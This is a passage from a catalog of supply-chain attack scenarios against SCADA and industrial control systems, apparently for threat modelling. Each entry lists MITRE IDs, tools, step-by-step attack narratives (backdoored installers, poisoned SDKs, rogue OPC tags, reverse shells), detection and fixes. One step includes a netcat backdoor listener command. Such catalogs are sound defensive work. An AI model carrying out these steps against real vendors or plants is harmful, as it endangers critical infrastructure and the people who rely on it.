- **Attack Steps**: Step 1: Attacker gains access to vendor’s SDK Git repository via leaked or stolen credentials (Tool: Git, Hydra).Step 2: Modifies source code to include a logic bomb that triggers when specific tags are written via API (Tool: Gedit, Notepad++).Step 3: Commits changes disguised as normal update and pushes to Git repo (Tool: Git CLI).Step 4: SCADA developers unknowingly integrate poisoned SDK into HMI/RTU systems (Tool: Visual Studio, Eclipse).Step 5: In production, the logic bomb activates on specific date, corrupting field tag data (Tool: SDK Payload embedded code).Step 6: Operator sees false data or unresponsive sensors, resulting in delayed safety response.
- **Detection**: Monitor SDK hash, code audits
- **Solution**: Audit third-party SDKs before integration
- **Tags**: SDK, DependencyAttack, LogicBomb, SCADA

## CI/CD Pipeline Poisoning at Vendor Level

- **Attack Type**: Supply Chain / CI-CD Compromise
- **Target**: Engineering Workstations
- **Vulnerability**: Lack of CI/CD hardening
- **MITRE**: T1195.002 + T1609
- **Impact**: Remote command execution, lateral movement
- **Tools**: Jenkins, GitLab, Cobalt Strike, Powershell Empire
- **Scenario**: Attacker compromises the continuous integration (CI) system of a SCADA software vendor to inject malware during builds.
- **Attack Steps**: Step 1: Attacker scans for exposed Jenkins dashboard using Shodan (Tool: Shodan, Burp Suite).Step 2: Exploits weak Jenkins credentials or plugin vulnerability to gain access (Tool: Metasploit, Nmap).Step 3: Modifies build scripts to include a reverse shell payload in SCADA software (Tool: msfvenom, bash).Step 4: Developers unknowingly sign and distribute compromised builds (Tool: CI build pipeline).Step 5: End-user installs software which initiates outbound reverse shell to attacker (Tool: Netcat, C2 framework).Step 6: Attacker now has remote shell on SCADA environment.
- **Detection**: Monitor CI logs, validate binary hashes
- **Solution**: Harden CI/CD, role-based access, code signing
- **Tags**: CI/CD, Pipeline, DevSec, SCADA

## Insider Compromise of Vendor Configuration Templates

- **Attack Type**: Supply Chain / Insider Tampering
- **Target**: HMI Projects
- **Vulnerability**: Trusted template manipulation
- **MITRE**: T1204.002 + T1053.005
- **Impact**: Long-term undetected HMI compromise
- **Tools**: Notepad++, Powershell, WinRAR
- **Scenario**: Insider at SCADA vendor modifies default HMI configuration template to include malicious auto-executing scripts.
- **Attack Steps**: Step 1: Insider opens template files shipped with default HMI project folder (Tool: Notepad++).Step 2: Injects a hidden Powershell script into “PostStartupScript.bat” (Tool: Powershell, cmd).Step 3: Compresses and uploads template to vendor distribution portal (Tool: WinRAR).Step 4: End-user imports template for quick project deployment.Step 5: On first HMI boot, the malicious script executes and creates scheduled task to launch reverse shell (Tool: schtasks, nc).Step 6: Attacker now gets shell access every time HMI reboots.
- **Detection**: Monitor file system events, scan template content
- **Solution**: Enforce template integrity via signatures
- **Tags**: Template, Insider, Configuration, HMI

## Fake Vendor Mobile App with SCADA Credentials Harvester

- **Attack Type**: Supply Chain / Mobile App Hijack
- **Target**: Field Technician Mobile Device
- **Vulnerability**: Trusting unofficial apps
- **MITRE**: T1505.003 (Server Software Component)
- **Impact**: Credential theft, lateral movement
- **Tools**: Apktool, Android Studio, Drozer, MITMf
- **Scenario**: Fake version of vendor’s mobile diagnostics app is uploaded to third-party app stores, designed to steal credentials.
- **Attack Steps**: Step 1: Attacker clones official SCADA vendor mobile app UI (Tool: Apktool).Step 2: Embeds credential harvester and C2 beacon into the APK (Tool: Android Studio, smali code injection).Step 3: Signs app with spoofed certificate (Tool: keytool, jarsigner).Step 4: Uploads to shady app repositories or sends via phishing email.Step 5: Field technician installs app assuming it’s official.Step 6: App sends SCADA panel credentials to attacker’s server over HTTPS (Tool: MITMf, Netcat).
- **Detection**: Monitor network egress, app whitelisting
- **Solution**: Only install from verified sources
- **Tags**: Mobile, AppSpoofing, SCADA, CredentialLeak

## Backdoored Vendor Update Disk via Logistics Interception

- **Attack Type**: Supply Chain / Physical Interception
- **Target**: SCADA Software Media
- **Vulnerability**: Trust in physical software media
- **MITRE**: T1200 + T1105
- **Impact**: Initial foothold in air-gapped environment
- **Tools**: HxD Hex Editor, ISOBuster, Nero Burning ROM
- **Scenario**: Attacker intercepts SCADA vendor’s update CD delivery and replaces it with modified disk containing hidden payloads.
- **Attack Steps**: Step 1: Attacker intercepts courier delivering software updates (Tool: Physical access).Step 2: Clones disk using ISOBuster and injects backdoor into setup.exe (Tool: Hex Editor, Resource Hacker).Step 3: Re-burns disk with matching volume label and vendor graphics (Tool: Nero Burning ROM).Step 4: Ships tampered disk to customer.Step 5: Engineer installs SCADA update from disk without verifying integrity.Step 6: Payload executes and opens a hidden tunnel to attacker’s IP (Tool: Netcat, Cobalt Strike).
- **Detection**: Use disk hashing, scan media
- **Solution**: Switch to secure digital delivery
- **Tags**: PhysicalAttack, BackdoorDisk, SCADA

## Vendor Website JavaScript Supply Chain Attack

- **Attack Type**: Supply Chain / Web Dependency Poisoning
- **Target**: Web HMI Panel
- **Vulnerability**: Insecure third-party scripts
- **MITRE**: T1554 + T1185
- **Impact**: Credential theft, control panel access
- **Tools**: Browser Dev Tools, Subresource Integrity Scanner, Evilginx
- **Scenario**: A vendor's website includes a malicious JS library in their SCADA web portal used by engineers for remote access.
- **Attack Steps**: Step 1: Attacker compromises third-party analytics JS CDN used on vendor portal.Step 2: Injects keylogger and session hijacking JS code (Tool: Evilginx).Step 3: Vendor site unknowingly loads modified script on web-based HMI panel.Step 4: Engineer logs in to SCADA remotely using browser (Tool: Chrome, Edge).Step 5: Keylogger steals credentials and sends them to attacker.Step 6: Attacker logs into web HMI panel with valid credentials.
- **Detection**: Use SRI hashes, CSP headers
- **Solution**: Use self-hosted scripts, audit dependencies
- **Tags**: JSInjection, WebPanel, CredentialSteal, HMI

## Tampered GSDML File for Industrial Protocol Hijack

- **Attack Type**: Supply Chain / Config File Poisoning
- **Target**: PLC Configuration Tools
- **Vulnerability**: GSDML file trust, no validation
- **MITRE**: T1195.002
- **Impact**: Hijack of real-time control traffic
- **Tools**: XML Editor, Wireshark, Profinet Test Suite
- **Scenario**: Attacker tampers with GSDML (Generic Station Description) file provided by vendor, manipulating protocol definitions to redirect traffic.
- **Attack Steps**: Step 1: Attacker modifies XML-based GSDML file downloaded from vendor site (Tool: XML Notepad).Step 2: Changes device profile to route Profinet packets via proxy address (Tool: Wireshark to analyze traffic).Step 3: User loads GSDML into SCADA or PLC configuration tool (Tool: TIA Portal, Profinet Suite).Step 4: During device communication, traffic is redirected to attacker proxy.Step 5: Attacker observes, modifies, or blocks industrial communication.Step 6: Subtle process malfunctions occur, difficult to detect.
- **Detection**: Monitor ARP/DNS redirection
- **Solution**: Validate XML configs with checksums
- **Tags**: Protocol, ConfigPoison, GSDML, Redirection

## Vendor Manual Injection – Malicious QR Code

- **Attack Type**: Supply Chain / Documentation-Based Attack
- **Target**: Technicians / Docs
- **Vulnerability**: Trust in technical manuals
- **MITRE**: T1204.001
- **Impact**: Credential theft via indirect medium
- **Tools**: QR Code Generator, PDF Editor, Phishing Framework
- **Scenario**: Attacker inserts malicious QR code in the vendor-provided PDF manual that links to credential harvesting site.
- **Attack Steps**: Step 1: Attacker downloads vendor installation manual (Tool: Acrobat Reader).Step 2: Replaces technical QR code with link to phishing page (Tool: PDF Editor, QR Generator).Step 3: Uploads modified manual to forum or sends via email.Step 4: Technician scans QR code using mobile device.Step 5: Phishing page mimics vendor login portal, captures SCADA credentials.Step 6: Attacker logs in remotely using stolen credentials.
- **Detection**: QR code monitoring tools, phishing page detection
- **Solution**: Validate PDFs from vendors
- **Tags**: Documentation, Phishing, QRCode, SCADA

## Signed Driver Manipulation via Vendor SDK Installer

- **Attack Type**: Supply Chain / Driver Hijack
- **Target**: Windows Kernel Driver
- **Vulnerability**: Trust in signed drivers
- **MITRE**: T1543.003 + T1068
- **Impact**: Stealthy control over SCADA process
- **Tools**: WinDbg, SigCheck, HookExplorer
- **Scenario**: SDK installer silently installs a signed but malicious kernel driver that grants ring-0 access to attacker.
- **Attack Steps**: Step 1: Attacker uploads SDK package to vendor site containing custom signed driver (Tool: InnoSetup, Signtool).Step 2: Driver installs silently with SDK (Tool: Installer script, INF manipulation).Step 3: Driver hooks into SCADA process memory and installs rootkit (Tool: HookExplorer).Step 4: Attacker sends crafted SCADA commands that driver intercepts and modifies.Step 5: Attacker controls process logic from user-space without alerting OS.Step 6: Hard to detect due to signed status.
- **Detection**: Driver integrity scan tools, process hooks detection
- **Solution**: Block unknown drivers, use whitelisting
- **Tags**: Driver, KernelAccess, Rootkit, SDK

## Reverse Engineering Stolen Installer and Rebuilding with Malware

- **Attack Type**: Supply Chain / Clone & Repackage
- **Target**: Engineering Laptop
- **Vulnerability**: Use of cracked software, no validation
- **MITRE**: T1486 (Data Encrypted for Impact)
- **Impact**: Complete loss of configuration access
- **Tools**: Ghidra, Resource Hacker, UPX, msfvenom
- **Scenario**: Attacker reverse engineers a leaked SCADA software installer and rebrands it with embedded ransomware, distributing it as a cracked version.
- **Attack Steps**: Step 1: Attacker downloads leaked SCADA installer from forums (Tool: Ghidra, WinRAR).Step 2: Extracts resources and recompiles with hidden ransomware payload (Tool: Resource Hacker, UPX).Step 3: Re-hosts cracked installer online and shares via dark web / Discord channels.Step 4: User installs pirated software on testbed system.Step 5: Ransomware encrypts SCADA config files and demands payment.Step 6: Critical plant operations are halted.
- **Detection**: Endpoint protection alerts, ransom notes
- **Solution**: Enforce software origin policies
- **Tags**: Ransomware, CrackedSoftware, Clone, Engineering

## Cloud Plugin Supply Chain Attack via Vendor Marketplace

- **Attack Type**: Supply Chain / Plugin Compromise
- **Target**: Cloud-based SCADA Dashboard
- **Vulnerability**: Lack of plugin code audit
- **MITRE**: T1554 + T1087.001
- **Impact**: Leakage of sensitive telemetry and credentials
- **Tools**: Node.js, AWS SDK, Burp Suite, ngrok
- **Scenario**: A malicious actor submits a fake plugin to a vendor's SCADA cloud marketplace, which gets installed by operators for added features.
- **Attack Steps**: Step 1: Attacker registers as developer on SCADA vendor’s plugin marketplace (Tool: Vendor Dev Portal).Step 2: Uploads a plugin mimicking popular energy dashboard, with malicious Node.js code (Tool: Node.js, Express).Step 3: Malicious code collects telemetry and credentials, exfiltrating them via HTTPS (Tool: ngrok, AWS Lambda as drop site).Step 4: Operator installs plugin to monitor energy usage in cloud SCADA dashboard.Step 5: Plugin runs persistently, sending internal data to attacker.Step 6: Attacker gains visibility into ICS operations and potentially controls cloud-based functions.
- **Detection**: Monitor outbound traffic, plugin behavior
- **Solution**: Audit third-party plugins, enforce sandboxing
- **Tags**: Cloud, PluginAbuse, TelemetryLeak

## Compromised Digital Certificate in Vendor Installer

- **Attack Type**: Supply Chain / Code Signing Abuse
- **Target**: SCADA Installer
- **Vulnerability**: Trust in signed executables
- **MITRE**: T1553.002 (Code Signing Abuse)
- **Impact**: Persistent remote access under vendor’s name
- **Tools**: Mimikatz, Signtool, InnoSetup, Cobalt Strike
- **Scenario**: The attacker uses a stolen code-signing certificate to sign malware as a legitimate SCADA vendor software installer.
- **Attack Steps**: Step 1: Attacker steals code-signing certificate from vendor dev machine (Tool: Mimikatz to dump private keys).Step 2: Rebuilds malware-laced installer using InnoSetup (Tool: InnoSetup, Resource Hacker).Step 3: Signs installer using stolen certificate (Tool: signtool).Step 4: Distributes the installer via phishing disguised as vendor update (Tool: Gophish or EmailSpoof).Step 5: Engineer installs signed executable assuming legitimacy.Step 6: Malware grants persistent access to attacker via Cobalt Strike beacon.
- **Detection**: Alert on signed binaries behaving anomalously
- **Solution**: Use certificate pinning and HSM
- **Tags**: Certificate, MalwareSigned, Phishing

## Malicious Firmware Update from Fake Vendor Email

- **Attack Type**: Supply Chain / Firmware Update Hijack
- **Target**: RTU / Field Device
- **Vulnerability**: Fake firmware update, lack of verification
- **MITRE**: T1542.001 + T1204.002
- **Impact**: Full remote compromise of RTU logic
- **Tools**: SET (Social Engineering Toolkit), Binwalk, Burp Suite
- **Scenario**: Attacker sends forged firmware update emails with links to malicious firmware files targeting specific RTUs.
- **Attack Steps**: Step 1: Attacker crafts a fake vendor email with spoofed header (Tool: SET, SMTP Spoofing).Step 2: Includes download link to compromised firmware file hosted on fake vendor site (Tool: Burp Suite, Apache).Step 3: Engineer downloads file, flashes RTU via serial console (Tool: Xmodem via Putty or TeraTerm).Step 4: Firmware executes and includes attacker backdoor to listen on hidden port.Step 5: Attacker later accesses RTU via network, issues custom Modbus commands.Step 6: Process logic is manipulated remotely.
- **Detection**: Check firmware checksum, anomaly detection
- **Solution**: Secure firmware with digital signatures
- **Tags**: Firmware, RTU, EmailAttack, Spoof

## Weaponized Help File in Vendor's Software Package

- **Attack Type**: Supply Chain / Documentation Exploit
- **Target**: HMI or Engineering Software
- **Vulnerability**: Trust in embedded help files
- **MITRE**: T1218.005 + T1559.001
- **Impact**: Code execution through documentation
- **Tools**: HTA Generator, CHM Compiler, mshta.exe
- **Scenario**: Attacker embeds a malicious CHM (help file) inside the vendor’s installation package to trigger command execution on opening.
- **Attack Steps**: Step 1: Attacker compiles a .CHM help file with embedded HTA payload (Tool: HTML Help Workshop).Step 2: Replaces legitimate help file in vendor’s software ZIP installer (Tool: WinRAR, Signtool).Step 3: End-user opens help from software interface or desktop shortcut.Step 4: Malicious HTA runs silently in the background, executes Powershell payload via mshta.exe (Tool: Powershell Empire).Step 5: Reverse shell connects to attacker’s C2 server.Step 6: Attacker explores and compromises adjacent ICS components.
- **Detection**: Monitor suspicious use of mshta.exe
- **Solution**: Disallow active scripting in help files
- **Tags**: CHM, HTA, HelpFile, EngineeringStation

## Compromised Python Dependency in Vendor Analytics Tool

- **Attack Type**: Supply Chain / Dependency Confusion
- **Target**: Data Analysis Module
- **Vulnerability**: Dependency confusion
- **MITRE**: T1554 + T1087.002
- **Impact**: Backdoor in vendor-branded analytic tools
- **Tools**: PyPi, setup.py, C2 server, PyInstaller
- **Scenario**: Attacker uploads malicious Python library to public PyPI with same name as internal vendor analytics module.
- **Attack Steps**: Step 1: Attacker guesses internal dependency name (e.g., scada_analytics) and uploads same-named malicious library to PyPI (Tool: Python setup.py).Step 2: Vendor build system mistakenly pulls public version (Tool: Pip, CI build script).Step 3: Malicious module includes C2 callback and credential stealer.Step 4: Packaged and shipped inside vendor analytics app to customers.Step 5: Execution triggers C2 beacon and collects system telemetry.Step 6: Attacker uses data for targeting and lateral movement.
- **Detection**: Monitor dependency origin, hash scanning
- **Solution**: Enforce internal-only package registries
- **Tags**: Python, PyPI, DependencyHack

## ICS Device Driver Installer Trojan

- **Attack Type**: Supply Chain / Driver Trojan
- **Target**: Engineering Workstation
- **Vulnerability**: Driver integrity not validated
- **MITRE**: T1055 + T1543.003
- **Impact**: Hidden persistent access into ICS zone
- **Tools**: WinDbg, HookExplorer, Device Manager
- **Scenario**: A custom driver installer for a SCADA field device is trojanized and bundled with rootkit functionality.
- **Attack Steps**: Step 1: Attacker clones legitimate vendor driver installer (Tool: Resource Hacker).Step 2: Injects rootkit DLLs to start hidden services at boot (Tool: rundll32.exe, regsvr32.exe).Step 3: Repackages as installer, uploads to forums with fake "performance fix" label.Step 4: Engineer installs driver on Engineering Workstation (Tool: Device Manager).Step 5: Rootkit hides specific ports and processes from Task Manager.Step 6: Attacker connects to hidden service and pivots laterally.
- **Detection**: Detect hidden services, DLL injection behavior
- **Solution**: Only use signed drivers; EDR enforcement
- **Tags**: Rootkit, DriverHijack, Engineering

## Vendor GitHub Repo Hijack to Inject Malicious Code

- **Attack Type**: Supply Chain / Public Repo Tampering
- **Target**: HMI Codebase
- **Vulnerability**: Poor domain hygiene; no repository monitoring
- **MITRE**: T1554
- **Impact**: Trojan injection at source code level
- **Tools**: GitHub CLI, dig, WHOIS, Malicious C source
- **Scenario**: A vendor forgets to renew GitHub repo domain; attacker re-registers domain, resets account, and uploads tampered SCADA code.
- **Attack Steps**: Step 1: Attacker notices expired vendor domain linked to GitHub repo.Step 2: Registers domain and requests password reset for GitHub repo.Step 3: Uploads trojanized source code mimicking official commit history.Step 4: Downstream SCADA developers clone the repo for HMI logic development.Step 5: Trojan includes logic to send tag values to attacker via HTTP POST.Step 6: Critical process data is exfiltrated.
- **Detection**: Hash checking and review of commit signatures
- **Solution**: Monitor domain renewal; signed commits
- **Tags**: GitHub, OpenSourceHijack, DomainExpiry

## USB Driver Auto-Install Abuse in Field Toolkits

- **Attack Type**: Supply Chain / USB Device Exploit
- **Target**: Field Engineering Kit
- **Vulnerability**: Auto-install and trust in physical devices
- **MITRE**: T1200 + T1053
- **Impact**: Initial ICS entry via peripheral
- **Tools**: USB Rubber Ducky, Zadig, Firmware Toolkit
- **Scenario**: Malicious firmware in a vendor-supplied USB-based SCADA configurator tool triggers auto-install of malware.
- **Attack Steps**: Step 1: Attacker implants malicious firmware in USB SCADA tool (Tool: Firmware mod toolkit).Step 2: When plugged into laptop, it identifies as HID keyboard and issues scripted commands (Tool: USB Rubber Ducky payload).Step 3: Opens CMD and downloads payload from attacker server.Step 4: Sets scheduled task for persistence (Tool: schtasks.exe).Step 5: Sends host info to remote C2.Step 6: Malware spreads across ICS engineering subnet.
- **Detection**: Monitor device enumeration events
- **Solution**: Disable auto-driver installs; USB lockdown
- **Tags**: USB, AutoRun, FirmwareExploit

## Poisoned Remote Monitoring DLL in SDK Tool

- **Attack Type**: Supply Chain / DLL Injection
- **Target**: SDK DLL
- **Vulnerability**: DLL not validated by user
- **MITRE**: T1574.002
- **Impact**: Credential theft and replay
- **Tools**: PE Explorer, DLL Injector, Wireshark
- **Scenario**: Vendor’s remote monitoring SDK includes a modified DLL that intercepts credentials and transmits to an attacker.
- **Attack Steps**: Step 1: Attacker modifies monitoring.dll to include hook into authentication function.Step 2: Re-signs DLL with vendor certificate if compromised (Tool: signtool).Step 3: DLL is packaged with SDK and delivered to customer.Step 4: Engineer compiles application using SDK.Step 5: Compiled app logs in using normal method, but credentials are intercepted by DLL and sent via DNS tunneling (Tool: iodine).Step 6: Attacker collects and reuses credentials.
- **Detection**: Monitor DLL file access and hashing
- **Solution**: Static analysis of SDK libraries
- **Tags**: SDK, DLLInjection, DNSExfil

## Supply Chain Attack via Malicious Language Pack

- **Attack Type**: Supply Chain / Localization Attack
- **Target**: SCADA HMI Panel
- **Vulnerability**: UI scripting via text field injection
- **MITRE**: T1059.005 (Visual Basic)
- **Impact**: Execution via UI-based script injection
- **Tools**: XML Editor, Script Hook, LangPack Compiler
- **Scenario**: Attacker modifies SCADA software language pack to include payloads in UI script interpreter for multi-language panels.
- **Attack Steps**: Step 1: Attacker modifies language XML file to include script inside labels (Tool: Notepad++, XML Validator).Step 2: Injects payload into tooltip text fields that trigger script interpreter (Tool: SCADA LangPack Compiler).Step 3: Hosts pack on fake “vendor partner” site.Step 4: User installs language pack for local language support.Step 5: On panel render, malicious label triggers hidden command (Tool: embedded interpreter).Step 6: Payload opens reverse connection to attacker.
- **Detection**: Monitor UI script runtime logs
- **Solution**: Sanitize and verify UI content fields
- **Tags**: LangPack, TooltipInjection, Scripting

## Vendor ISO Image Compromise Before Release

- **Attack Type**: Supply Chain / ISO Tampering
- **Target**: SCADA Base OS
- **Vulnerability**: Lack of ISO hash validation
- **MITRE**: T1195.002 + T1543.003
- **Impact**: Persistent root access on base SCADA image
- **Tools**: ISOMaster, HxD, Resource Hacker
- **Scenario**: A malicious actor compromises the vendor’s ISO image used for initial SCADA system installation, embedding malware within core scripts.
- **Attack Steps**: Step 1: Attacker accesses vendor ISO build server using default credentials (Tool: Nmap, Hydra).Step 2: Modifies initialization scripts in ISO image to insert a hidden backdoor (Tool: ISOMaster, bash).Step 3: Adds autorun command that installs persistent C2 agent (Tool: msfvenom, crontab).Step 4: Vendor signs and publishes ISO as new SCADA deployment release.Step 5: ICS engineers install SCADA system using compromised ISO.Step 6: Upon first boot, backdoor connects to attacker’s server.
- **Detection**: Monitor image hash vs vendor checksum
- **Solution**: Verify ISO image signature and use offline validation
- **Tags**: ISO, Rootkit, InitialAccess

## Malicious Screensaver File in Vendor UI Resource Pack

- **Attack Type**: Supply Chain / Resource Injection
- **Target**: SCADA Engineering Workstation
- **Vulnerability**: Screensaver file not verified
- **MITRE**: T1204.002 + T1036.005
- **Impact**: Out-of-hours compromise and persistence
- **Tools**: Resource Hacker, PowerShell, C2 Framework
- **Scenario**: An attacker replaces the default screensaver file in the vendor UI resources with one that executes malicious scripts on timeout.
- **Attack Steps**: Step 1: Attacker gains access to vendor's shared resource repository (Tool: SMB exploit, Metasploit).Step 2: Replaces .scr screensaver file with a modified version containing obfuscated payload (Tool: PowerShell obfuscator, Resource Hacker).Step 3: Vendor ships updated UI resources to customers as minor patch.Step 4: ICS operator installs the patch assuming it’s safe.Step 5: After workstation idle timeout, malicious .scr runs, triggering payload (Tool: schtasks, mshta).Step 6: System compromised silently after working hours.
- **Detection**: Monitor screen timeout script execution
- **Solution**: Restrict executable screensavers and scan UI packs
- **Tags**: Screensaver, TimeoutAttack, ResourcePack

## Poisoned AutoCAD Block from Vendor Toolkit

- **Attack Type**: Supply Chain / CAD Object Tampering
- **Target**: Design Workstation
- **Vulnerability**: Unscanned AutoCAD macros
- **MITRE**: T1059.005 + T1203
- **Impact**: CAD-based entry into ICS network
- **Tools**: AutoCAD, Visual LISP Editor, Netcat
- **Scenario**: An infected AutoCAD object in a vendor-supplied mechanical block library contains AutoLISP code to execute malware.
- **Attack Steps**: Step 1: Attacker injects AutoLISP macro in a block used in mechanical drawings (Tool: Visual LISP Editor).Step 2: Uploads block to vendor's mechanical library (Tool: FTP or CMS interface).Step 3: Engineer inserts block into plant schematic using AutoCAD.Step 4: On file open, macro executes and opens reverse shell (Tool: Netcat listener).Step 5: Attacker gains shell access to design workstation and searches for sensitive PLC logic.Step 6: Further lateral movement into ICS toolchain.
- **Detection**: Disable macros by default, monitor AutoCAD calls
- **Solution**: Review vendor CAD objects before use
- **Tags**: CAD, MacroAttack, AutoLISP, Engineering

## Poisoned Patch Notes PDF from Vendor

- **Attack Type**: Supply Chain / Document Exploit
- **Target**: Admin Workstation
- **Vulnerability**: Zero-day PDF vulnerability
- **MITRE**: T1203
- **Impact**: Remote compromise of SCADA workstation
- **Tools**: EvilPDF, msfvenom, PDF Toolkit
- **Scenario**: A malicious patch note PDF sent from a spoofed vendor source triggers zero-day vulnerability in PDF reader, allowing remote code execution.
- **Attack Steps**: Step 1: Attacker forges vendor update email (Tool: SET, SPF bypass).Step 2: Generates malicious PDF with embedded payload (Tool: EvilPDF or PDF Toolkit).Step 3: Links PDF in patch notification email with believable changelog content.Step 4: ICS admin opens file in vulnerable reader (e.g., Adobe Reader).Step 5: Exploit triggers and payload installs reverse shell (Tool: msfvenom + Netcat).Step 6: Attacker begins internal reconnaissance.
- **Detection**: Behavior-based endpoint detection, zero-day alerts
- **Solution**: Use hardened PDF viewers and validate sources
- **Tags**: PDFExploit, PatchNote, Phishing

## Poisoned Asset Inventory Plugin

- **Attack Type**: Supply Chain / Plugin Compromise
- **Target**: ICS Security Workstation
- **Vulnerability**: Community plugin vetting gap
- **MITRE**: T1087 + T1046
- **Impact**: Full map of SCADA asset IPs and services
- **Tools**: Python, YARA, PyInstaller, Requests
- **Scenario**: An asset inventory plugin supplied by a vendor reseller is injected with malicious code to enumerate network assets and send them to attacker.
- **Attack Steps**: Step 1: Attacker modifies plugin source code to include asset scanner module (Tool: Python + nmap wrapper).Step 2: Recompiles using PyInstaller and retains official GUI (Tool: PyInstaller, Tkinter).Step 3: Submits plugin to vendor community store under fake partner account.Step 4: ICS security admin installs plugin expecting enhanced visibility.Step 5: Plugin scans all connected ICS IP ranges and sends JSON data to attacker (Tool: Requests, base64 encoding).Step 6: Attacker builds network map of victim SCADA infrastructure.
- **Detection**: Monitor outbound JSON or unusual connections
- **Solution**: Block unauthorized plugin installs, enforce review
- **Tags**: AssetMapping, PluginBackdoor, Recon

## Compromised Vendor Chatbot Delivering Malicious Links

- **Attack Type**: Supply Chain / Web-based Social Engineering
- **Target**: ICS Admin Laptop
- **Vulnerability**: Compromised trusted web source
- **MITRE**: T1204.001
- **Impact**: Trusted interface becomes infection vector
- **Tools**: Browser DevTools, WebShell, Reverse Proxy
- **Scenario**: Vendor support chatbot on official website is compromised and begins delivering payload links when queried about "patch files."
- **Attack Steps**: Step 1: Attacker finds LFI vulnerability in chatbot backend (Tool: Burp Suite, LFI wordlist).Step 2: Uploads web shell and gains access to chatbot’s response logic (Tool: PHP web shell).Step 3: Edits logic to respond to patch queries with payload URL (Tool: Reverse proxy to malware server).Step 4: ICS admin downloads patch via link shared by chatbot.Step 5: Executes binary that installs rootkit.Step 6: Rootkit hides itself and begins keylogging and exfiltration.
- **Detection**: Alert on outbound connection to unknown domains
- **Solution**: Secure vendor web components, isolate support channels
- **Tags**: Chatbot, WebShell, SocialEngineering

## Compromised Vendor Driver Updates via Redirected DNS

- **Attack Type**: Supply Chain / DNS Hijacking
- **Target**: Engineering Station
- **Vulnerability**: DNS resolution tampering
- **MITRE**: T1203 + T1071.001
- **Impact**: Infection through poisoned update path
- **Tools**: dnsspoof, Bind9, Wireshark
- **Scenario**: Attacker uses DNS cache poisoning to redirect SCADA clients to fake vendor domain hosting malicious driver updates.
- **Attack Steps**: Step 1: Attacker poisons DNS cache on local router or gateway (Tool: dnsspoof, ettercap).Step 2: Redirects update.vendorscada.com to attacker-controlled IP.Step 3: Hosts malicious driver update disguised as vendor's package.Step 4: ICS engineer downloads file expecting an update.Step 5: Installs driver, which also deploys beacon to attacker (Tool: Wireshark to monitor, Netcat for control).Step 6: Attacker pivots from workstation to PLC network.
- **Detection**: DNS integrity check, anomaly in hostname resolution
- **Solution**: Use DNSSEC and enforce HTTPS-only downloads
- **Tags**: DNSPoison, FakeUpdate, SCADA

## Vendor Cloud Backup API Key Leak in SDK

- **Attack Type**: Supply Chain / Hardcoded Secrets
- **Target**: Cloud Backup Systems
- **Vulnerability**: Secrets in source code
- **MITRE**: T1552.001 + T1496
- **Impact**: Destruction of backup systems
- **Tools**: Git, grep, AWS CLI
- **Scenario**: Vendor SDK for cloud backup exposes hardcoded API keys in source code, used by attacker to delete cloud backups.
- **Attack Steps**: Step 1: Attacker examines SDK source code publicly shared on GitHub (Tool: grep -r 'API_KEY').Step 2: Extracts embedded AWS credentials in config.py.Step 3: Authenticates to cloud vendor account (Tool: AWS CLI).Step 4: Lists all customer backup volumes.Step 5: Deletes critical SCADA backup snapshots.Step 6: Victim unable to restore system after ransomware attack.
- **Detection**: API activity monitoring, credential vaulting
- **Solution**: Scan SDK for hardcoded secrets before release
- **Tags**: Secrets, CloudAPI, SDK

## Field Test Firmware from Vendor Infected During QA

- **Attack Type**: Supply Chain / Pre-Release Infection
- **Target**: PLC Device
- **Vulnerability**: QA process subverted by insider
- **MITRE**: T1546.008 + T1195.002
- **Impact**: Stealth access to new field-deployed PLCs
- **Tools**: JTAG debugger, Firmware Editor, Netcat
- **Scenario**: Field test firmware for new PLC models is infected by a compromised QA engineer who inserts covert persistence mechanism.
- **Attack Steps**: Step 1: Insider QA engineer modifies field test firmware to include debug mode listener (Tool: Firmware unpacker, Hex Editor).Step 2: Signs firmware using dev cert and uploads to vendor FTP.Step 3: Customers install firmware during limited deployment test.Step 4: Firmware listens for special trigger on port 9001 to activate shell (Tool: nc -lvp 9001).Step 5: Attacker activates backdoor from nearby device.Step 6: Full remote command shell obtained.
- **Detection**: JTAG inspection, unusual ports monitoring
- **Solution**: Secure firmware chain, log QA firmware hashes
- **Tags**: QA, FieldFirmware, InsiderAccess

## Poisoned File Compressor in Vendor Toolkit

- **Attack Type**: Supply Chain / Tool Tampering
- **Target**: SCADA File Utility
- **Vulnerability**: Tool integrity unchecked
- **MITRE**: T1204.002 + T1566
- **Impact**: Silent, wide propagation of malware
- **Tools**: UPX, 7-Zip SDK, OllyDbg
- **Scenario**: Custom SCADA file compressor utility is trojanized and recompressed to infect every archive created by it.
- **Attack Steps**: Step 1: Attacker modifies vendor's .exe file compressor tool (Tool: OllyDbg, 7-Zip SDK).Step 2: Injects payload that attaches itself to every compressed file created (Tool: UPX to repackage).Step 3: Uploads modified utility to vendor FTP site.Step 4: ICS engineers use tool to compress backups and configs.Step 5: Payload activates on decompression and infects every target (Tool: WinRAR + task scheduler).Step 6: Attacker gains wide access as tool spreads.
- **Detection**: Scan tool hash and file behavior
- **Solution**: Validate vendor utilities and perform sandbox testing
- **Tags**: Compressor, ToolInfect, FileSpreader

## Poisoned Vendor Template with Pre-Configured OPC Tag Hijack

- **Attack Type**: Supply Chain / Template Compromise
- **Target**: HMI Panels / OPC Server
- **Vulnerability**: OPC config files not validated
- **MITRE**: T1040 + T1021.006
- **Impact**: Operational deception via rogue tags
- **Tools**: TIA Portal, OPC-UA Explorer, Wireshark
- **Scenario**: A malicious pre-configured SCADA project template is modified to use attacker-controlled OPC tags, allowing external control.
- **Attack Steps**: Step 1: Attacker downloads official vendor template from partner portal.Step 2: Modifies OPC UA tag list to point to attacker-controlled server (Tool: TIA Portal, OPC UA Editor).Step 3: Uploads the template under a similar name to vendor partner library.Step 4: Engineer uses template to build new HMI project.Step 5: HMI unknowingly connects to rogue server to read tag values.Step 6: Attacker feeds false values like 0 pressure or “OK” status, misleading operators.
- **Detection**: Monitor OPC server sources, alert on unknown IPs
- **Solution**: Use internal-only tag sources and audit templates
- **Tags**: OPC, TemplateHijack, TagSpoof

## Poisoned Driver Dependency in Vendor SDK Installer

- **Attack Type**: Supply Chain / Dependency Tampering
- **Target**: Engineering Station
- **Vulnerability**: Unchecked DLLs in SDK
- **MITRE**: T1574.002 + T1005
- **Impact**: Instruction logging, data theft
- **Tools**: DLL Proxy Generator, PE Explorer, SDK Builder
- **Scenario**: A third-party driver DLL in the vendor’s SDK is replaced with a trojanized version that logs all PLC instructions.
